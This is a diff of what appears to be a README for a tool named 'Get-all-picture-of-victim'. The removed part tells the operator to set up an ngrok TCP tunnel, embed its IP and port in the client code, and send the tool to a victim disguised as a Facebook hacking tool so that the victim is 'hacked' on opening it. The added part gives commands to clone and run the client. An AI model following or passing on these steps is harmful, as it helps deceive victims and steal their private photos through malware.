@@ -1,17 +1,11 @@
-## If you want to use our tool you need follow these steps:
-#### Install ngrok from this link.
-<a href="https://dashboard.ngrok.com/get-started/setup">Click</a>
-### Than you need setup the ngrok. (Use Google or YouTube)
-### Than use theis command :
+# Follow Me : 
 ```bash
-ngrok tcp 9999 
+pip install tqdm
 ```
-### Than copy the link and find the ip.
 ```bash
-#in cmd
-ping [link]
+apt install git
+pkg install git
+git clone https://github.com/iii800/Get-all-picture-of-victim..git
+cd Get-all-picture-of-victim.
+python client.py
 ```
-### Than copy the ip paste it in client code's , ip veryable.
-### Also copy and paste the port. (The port is beside the link.)
-
-# Than send to victim. And you should say it is a facebook hacking tool. After opening the tool he will hacked.
